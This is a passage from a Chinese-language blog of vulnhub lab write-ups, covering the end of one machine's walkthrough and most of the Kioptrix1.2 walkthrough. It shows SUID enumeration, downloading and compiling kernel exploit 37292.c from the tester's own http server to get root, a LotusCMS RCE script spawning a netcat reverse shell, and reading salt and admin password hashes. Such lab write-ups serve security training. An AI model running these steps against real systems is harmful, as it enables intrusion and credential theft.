class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@simple:/$ <span class="hljs-built_in">cat</span> /etc/passwd<br><span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>libuuid:x:100:101::/var/lib/libuuid:<br>syslog:x:101:104::/home/syslog:/bin/false<br>mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false<br>messagebus:x:103:107::/var/run/dbus:/bin/false<br>landscape:x:104:110::/var/lib/landscape:/bin/false<br>bull:x:1000:1000:bull,,,:/home/bull:/bin/bash<br>www-data@simple:/$ <span class="hljs-built_in">cat</span> /etc/shadow<br><span class="hljs-built_in">cat</span> /etc/shadow<br><span class="hljs-built_in">cat</span>: /etc/shadow: Permission denied<br></code></pre></td></tr></table></figure><p>shadow 中没有权限，试一试 home 目录中的用户的历史文件，也没有收获。试试 s 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@simple:/usr/share/mysql$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>278515  316 -rwsr-xr--   1 root     dip        323000 Nov 25  2014 /usr/sbin/pppd<br>278836   20 -rwsr-sr-x   1 libuuid  libuuid     17996 Feb 12  2015 /usr/sbin/uuidd<br>280600   12 -rwsr-xr-x   1 root     root         9804 Feb 11  2014 /usr/lib/policykit-1/polkit-agent-helper-1<br>263326   12 -rwsr-xr-x   1 root     root         9612 Dec  4  2014 /usr/lib/pt_chown<br>278398  484 -rwsr-xr-x   1 root     root       492972 May 12  2014 /usr/lib/openssh/ssh-keysign<br>262362    8 -rwsr-xr-x   1 root     root         5480 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device<br>276259  328 -rwsr-xr--   1 root     messagebus   333952 Nov 25  2014 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>262155   32 -rwsr-xr-x   1 root     root        30984 Feb 16  2014 /usr/bin/newgrp<br>262012   44 -rwsr-xr-x   1 root     root        44620 Feb 16  2014 /usr/bin/chfn<br>262015   36 -rwsr-xr-x   1 root     root        35916 Feb 16  2014 /usr/bin/chsh<br>262273  156 -rwsr-xr-x   1 root     root       156708 Feb 10  2014 /usr/bin/sudo<br>280595   20 -rwsr-xr-x   1 root     root        18168 Feb 11  2014 /usr/bin/pkexec<br>262086   68 -rwsr-xr-x   1 root     root        66252 Feb 16  2014 /usr/bin/gpasswd<br>278261   20 -rwsr-xr-x   1 root     root        18136 May  7  2014 /usr/bin/traceroute6.iputils<br>278345   72 -rwsr-xr-x   1 root     root        72860 Oct 21  2013 /usr/bin/mtr<br>279461   48 -rwsr-sr-x   1 daemon   daemon      46652 Oct 21  2013 /usr/bin/at<br>262167   48 -rwsr-xr-x   1 root     root        45420 Feb 16  2014 /usr/bin/passwd<br>277224   32 -rwsr-xr-x   1 root     root        30112 Dec 16  2013 /bin/fusermount<br>261725   36 -rwsr-xr-x   1 root     root        35300 Feb 16  2014 /bin/su<br>261706   44 -rwsr-xr-x   1 root     root        43316 May  7  2014 /bin/ping6<br>261705   40 -rwsr-xr-x   1 root     root        38932 May  7  2014 /bin/ping<br>261692   88 -rwsr-xr-x   1 root     root        88752 Feb 12  2015 /bin/mount<br>261733   68 -rwsr-xr-x   1 root     root        67704 Feb 12  2015 /bin/umount<br></code></pre></td></tr></table></figure><p>依旧没收获，考虑内核提权</p><p><img src="/pic/8657b5b61e08fcbd3bc6584eb7a89c68_MD5.png"></p><p>本机 python 开启 http 服务，然后在 shell 中下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@simple:/tmp$ wget http://192.168.56.106:8088/37292.c<br>wget http://192.168.56.106:8088/37292.c<br>--2023-05-26 23:02:01--  http://192.168.56.106:8088/37292.c<br>Connecting to 192.168.56.106:8088... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 4968 (4.9K) [text/x-csrc]<br>Saving to: <span class="hljs-string">&#x27;37292.c&#x27;</span><br><br>100%[======================================&gt;] 4,968       --.-K/s   <span class="hljs-keyword">in</span> 0s      <br><br>2023-05-26 23:02:01 (1.06 GB/s) - <span class="hljs-string">&#x27;37292.c&#x27;</span> saved [4968/4968]<br><br></code></pre></td></tr></table></figure><p>尝试成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@simple:/tmp$ <span class="hljs-built_in">mv</span> 37292.c ofs.c<br><span class="hljs-built_in">mv</span> 37292.c ofs.c<br>www-data@simple:/tmp$ gcc ofs.c -o ofs<br>gcc ofs.c -o ofs<br>www-data@simple:/tmp$ ./ofs<br>./ofs<br>spawning threads<br>mount <span class="hljs-comment">#1</span><br>mount <span class="hljs-comment">#2</span><br>child threads <span class="hljs-keyword">done</span><br>/etc/ld.so.preload created<br>creating shared library<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),33(www-data)<br><span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-comment"># ls -liah</span><br><span class="hljs-built_in">ls</span> -liah<br>total 20K<br>261842 drwx------  2 root root 4.0K Sep 21  2015 .<br>     2 drwxr-xr-x 21 root root 4.0K Sep  9  2015 ..<br>261843 -rw-r--r--  1 root root 3.1K Feb 19  2014 .bashrc<br>261844 -rw-r--r--  1 root root  140 Feb 19  2014 .profile<br>261852 -rw-------  1 root root   52 Sep 21  2015 flag.txt<br><span class="hljs-comment"># cat flag.txt</span><br><span class="hljs-built_in">cat</span> flag.txt<br>U wyn teh Interwebs!!1eleven11!!1!<br>Hack the planet!<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kioptrix1.2靶机</title>
    <link href="/2023/05/3ec3f9289747.html"/>
    <url>/2023/05/3ec3f9289747.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>这台靶机主要涉及信息收集能力，漏洞利用 getshell 较为简单，提权也并不复杂，最花时间的是从最低权限的 shell 中收集有效信息的过程，其中有些是有效信息有些是无效信息，需要仔细鉴别，防止陷入兔子洞。</p></blockquote><h1 id="Kioptrix1-2靶机"><a href="#Kioptrix1-2靶机" class="headerlink" title="Kioptrix1.2靶机"></a>Kioptrix1.2靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/pic/b3da79520ae9ff6de6695923aa6dcf23_MD5.png" alt="image.png"></p><p><img src="/pic/4e9ce50884fb44ac035464d0f4d34982_MD5.png" alt="image.png"></p><h2 id="web查看"><a href="#web查看" class="headerlink" title="web查看"></a>web查看</h2><p>这里先按照vulhub上界面的提示，在hosts文件中加入了相应域名和ip的对应</p><p><img src="/pic/d1fa79d0ba30328788178518b55aafa4_MD5.png" alt="image.png"></p><p>查看主页面</p><p><img src="/pic/cf5b86be25aaf5b3fcce85198fb3d76d_MD5.png" alt="image.png"></p><p>这个界面中有三处可以跳转的地方，分别对应了blog、login和gallery</p><p><img src="/pic/772c6cc93937c1da1f82cfa6e30f6767_MD5.png" alt="image.png"></p><p><img src="/pic/ee81adf03081302459d0556f183bb7f0_MD5.png" alt="image.png"></p><p>这里得到了cms的名字LotusCMS</p><p><img src="/pic/5b1d5be81d07e1cfc65a7071c31ef53c_MD5.png" alt="image.png"></p><p>最有价值的信息就是cms的名字和登录界面</p><p>搜索一下这个cms的漏洞</p><p><img src="/pic/bf3eff94044b1731be09aaa7ea8a4d11_MD5.png" alt="image.png"></p><p>第一个脚本是通过msf利用的，试一下</p><p><img src="/pic/d5418d317d6c37762ee28c7d52951a4a_MD5.png" alt="image.png"></p><p>失败了，去谷歌吧</p><p><img src="/pic/3d46125818ee5890708186bcff5628ca_MD5.png" alt="image.png"></p><p>确实是有这个cms的利用方式的，而且根据靶机的时间判断，应该对应这个漏洞</p><p><img src="/pic/90dff3701f24f0c24f8478494eeb2107_MD5.png" alt="image.png"></p><p>给了两个文件还有对应的demo视频</p><p>那就把sh文件下载下来，然后运行试试，这里只列出文件开头给出的使用方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">USAGE: ./lotusRCE.sh target lotusCMS-path</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">USAGE: ./lotusRCE.sh ki0ptrix3.com /</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">USAGE: ./lotusRCE.sh 192.168.1.36 /lcms/</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Enter IP and PORT when asked to spawn netcat based reverse shell ;)</span><br></code></pre></td></tr></table></figure><p><img src="/pic/0e80c0cf7586e1e96be9943229b616fc_MD5.png" alt="image.png"></p><p>刚开始尝试直接输入<code>NetCat /dev/tcp</code>但是始终没有反应，看了视频才发现，这里原来是输序号的……</p><p>反弹shell成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 443            <br>[sudo] password for kali: <br>listening on [any] 443 ...<br>connect to [192.168.25.128] from (UNKNOWN) [192.168.25.130] 36437<br>whoami<br>www-data<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>来一波信息收集</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ sudo -l<br>sudo -l<br>[sudo] password for www-data: <br><br>www-data@Kioptrix3:/home/www/kioptrix3.com$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue <br>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000<br>    link/ether 00:0c:29:82:a5:78 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.25.130/24 brd 192.168.25.255 scope global eth1<br>    inet6 fe80::20c:29ff:fe82:a578/64 scope link <br>       valid_lft forever preferred_lft forever<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ cat /etc/passwd<br>cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br>bin:x:2:2:bin:/bin:/bin/sh<br>sys:x:3:3:sys:/dev:/bin/sh<br>sync:x:4:65534:sync:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/bin/sh<br>man:x:6:12:man:/var/cache/man:/bin/sh<br>lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br>mail:x:8:8:mail:/var/mail:/bin/sh<br>news:x:9:9:news:/var/spool/news:/bin/sh<br>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh<br>proxy:x:13:13:proxy:/bin:/bin/sh<br>www-data:x:33:33:www-data:/var/www:/bin/sh<br>backup:x:34:34:backup:/var/backups:/bin/sh<br>list:x:38:38:Mailing List Manager:/var/list:/bin/sh<br>irc:x:39:39:ircd:/var/run/ircd:/bin/sh<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh<br>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh<br>libuuid:x:100:101::/var/lib/libuuid:/bin/sh<br>dhcp:x:101:102::/nonexistent:/bin/false<br>syslog:x:102:103::/home/syslog:/bin/false<br>klog:x:103:104::/home/klog:/bin/false<br>mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false<br>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin<br>loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash<br>dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ id<br>id<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ uname -a<br>uname -a<br>Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ sudo -l<br>sudo -l<br>[sudo] password for www-data: <br><br>www-data@Kioptrix3:/home/www/kioptrix3.com$<br></code></pre></td></tr></table></figure><p>有个特殊的文件 ht</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com$ find / -type f -perm -04000 -ls 2&gt;/dev/null<br>&lt;w/kioptrix3.com$ find / -type f -perm -04000 -ls 2&gt;/dev/null                <br> 66011    8 -rwsr-xr-x   1 root     root         4588 Aug 22  2008 /usr/lib/eject/dmcrypt-get-device<br> 90114  172 -rwsr-xr-x   1 root     root       168340 May 14  2008 /usr/lib/openssh/ssh-keysign<br> 90491   12 -rwsr-xr--   1 root     www-data    10276 Jun 18  2009 /usr/lib/apache2/suexec<br> 54187   12 -rwsr-xr-x   1 root     root         9624 Jan 11  2011 /usr/lib/pt_chown<br> 53422   12 -rwsr-xr-x   1 root     root        11048 Dec 10  2007 /usr/bin/arping<br> 53651   48 -rwsr-xr-x   1 root     root        46084 Mar 31  2008 /usr/bin/mtr<br> 50857   20 -rwsr-xr-x   1 root     root        19144 Dec  8  2008 /usr/bin/newgrp<br> 51026   28 -rwsr-xr-x   1 root     root        28624 Dec  8  2008 /usr/bin/chfn<br> 51029   40 -rwsr-xr-x   1 root     root        37360 Dec  8  2008 /usr/bin/gpasswd<br> 52498  112 -rwsr-xr-x   2 root     root       107936 Feb 16  2009 /usr/bin/sudo<br> 53212   40 -rwsr-sr-x   1 daemon   daemon      38464 Feb 20  2007 /usr/bin/at<br> 52498  112 -rwsr-xr-x   2 root     root       107936 Feb 16  2009 /usr/bin/sudoedit<br> 51027   24 -rwsr-xr-x   1 root     root        23952 Dec  8  2008 /usr/bin/chsh<br> 51030   32 -rwsr-xr-x   1 root     root        29104 Dec  8  2008 /usr/bin/passwd<br> 53424   16 -rwsr-xr-x   1 root     root        12296 Dec 10  2007 /usr/bin/traceroute6.iputils<br> 58472 2028 -rwsr-sr-x   1 root     root      2072344 Apr 16  2011 /usr/local/bin/ht<br> 53710  268 -rwsr-xr--   1 root     dip        269256 Oct  4  2007 /usr/sbin/pppd<br> 52260   16 -rwsr-sr-x   1 libuuid  libuuid     12336 Mar 27  2008 /usr/sbin/uuidd<br>582147    4 -rwsr-xr--   1 root     dhcp         2960 Apr  2  2008 /lib/dhcp3-client/call-dhclient-script<br>196704   20 -rwsr-xr--   1 root     fuse        20056 Feb 26  2008 /bin/fusermount<br>196667   32 -rwsr-xr-x   1 root     root        30856 Dec 10  2007 /bin/ping<br>196644   84 -rwsr-xr-x   1 root     root        81368 Sep 26  2008 /bin/mount<br>196645   68 -rwsr-xr-x   1 root     root        63584 Sep 26  2008 /bin/umount<br>196668   28 -rwsr-xr-x   1 root     root        26684 Dec 10  2007 /bin/ping6<br>196641   28 -rwsr-xr-x   1 root     root        25540 Dec  8  2008 /bin/su<br></code></pre></td></tr></table></figure><p>找了一圈没发现ht的suid的利用方法，接着信息收集吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com$ cat /etc/crontab<br>cat /etc/crontab<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/etc/crontab: system-wide crontab</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Unlike any other crontab you don<span class="hljs-string">&#x27;t have to run the `crontab&#x27;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">command</span> to install the new version when you edit this file</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">and files <span class="hljs-keyword">in</span> /etc/cron.d. These files also have username fields,</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">that none of the other crontabs <span class="hljs-keyword">do</span>.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">m h dom mon dow user  <span class="hljs-built_in">command</span></span><br>17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-meta prompt_">#</span><br></code></pre></td></tr></table></figure><p>定时任务里没收获，四处走走看看吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com/data$ ls -liah<br>ls -liah<br>total 36K<br>631216 drwxrwxrwx  8 root root 4.0K Apr 14  2011 .<br>630792 drwxr-xr-x  8 root root 4.0K Apr 15  2011 ..<br>631217 -rwxrwxrwx  1 root root   13 Apr  1  2006 .htaccess<br>631218 drwxrwxrwx  3 root root 4.0K Apr 14  2011 config<br>631229 drwxrwxrwx  2 root root 4.0K Apr 14  2011 filebackups<br>631231 drwxrwxrwx  2 root root 4.0K Apr 14  2011 files<br>631233 -rwxrwxrwx  1 root root    0 Apr 11  2010 index.php<br>631234 drwxrwxrwx 10 root root 4.0K Apr 14  2011 modules<br>631266 drwxrwxrwx  2 root root 4.0K Apr 14  2011 pages<br>631269 drwxrwxrwx  2 root root 4.0K Apr 14  2011 users<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data$ cd config<br>cd config<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ ls -liah<br>ls -liah<br>total 36K<br>631218 drwxrwxrwx 3 root root 4.0K Apr 14  2011 .<br>631216 drwxrwxrwx 8 root root 4.0K Apr 14  2011 ..<br>631219 -rwxrwxrwx 1 root root    4 Oct  2  2010 active_design.dat<br>631220 -rwxrwxrwx 1 root root    0 Apr 11  2010 index.php<br>631221 drwxrwxrwx 2 root root 4.0K Apr 14  2011 modules<br>631224 -rwxrwxrwx 1 root root   30 Apr 14  2011 salt.dat<br>631225 -rwxrwxrwx 1 root root   21 Oct  2  2010 site_description.dat<br>631226 -rwxrwxrwx 1 root root    8 Oct  2  2010 site_keywords.dat<br>631227 -rwxrwxrwx 1 root root   15 Apr 14  2011 site_title.dat<br>631228 -rwxrwxrwx 1 root root    5 Mar 14  2011 site_version.dat<br></code></pre></td></tr></table></figure><p>有一些有意思的文件，挨个看看吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ ls<br>ls<br>active_design.dat  modules   site_description.dat  site_title.dat<br>index.php          salt.dat  site_keywords.dat     site_version.dat<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat salt.dat<br>cat salt.dat<br>gtZBO2PewhZHR10hGXLaSt0Bc5Ub73<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat site_description.dat<br>&lt;w/kioptrix3.com/data/config$ cat site_description.dat                       <br>Your Site Description<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat site_keywords.dat<br>cat site_keywords.dat<br>LotusCMS<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat index.php<br>cat index.php<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat active_design.dat<br>cat active_design.dat<br>grey<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat site_version.dat<br>cat site_version.dat<br>3.0.5<br></code></pre></td></tr></table></figure><p>一是确定了LotusCMS的版本（都已经打进来了，版本号也没什么用了），二是拿到了salt，或许之后用得到。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com/data$ cd users<br>cd users<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/users$ ls -liah<br>ls -liah<br>total 12K<br>631269 drwxrwxrwx 2 root     root     4.0K Apr 14  2011 .<br>631216 drwxrwxrwx 8 root     root     4.0K Apr 14  2011 ..<br>631270 -rw-r--r-- 1 www-data www-data   67 Apr 15  2011 admin.dat<br>631271 -rwxrwxrwx 1 root     root        0 Apr 11  2010 index.php<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/users$ cat admin.dat<br>cat admin.dat<br>|318d8dd409db395f0317efa71b3bad13e1fb9857|administrator|bla@bla.com<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/users$ cat index.php<br>cat index.php<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/users$ <br></code></pre></td></tr></table></figure><p>admin.dat里有密码，尝试在线网站破解失败，尝试一下本地破解？</p><p>接着搜集一下信息吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com$ ls gallery<br>ls gallery<br>BACK         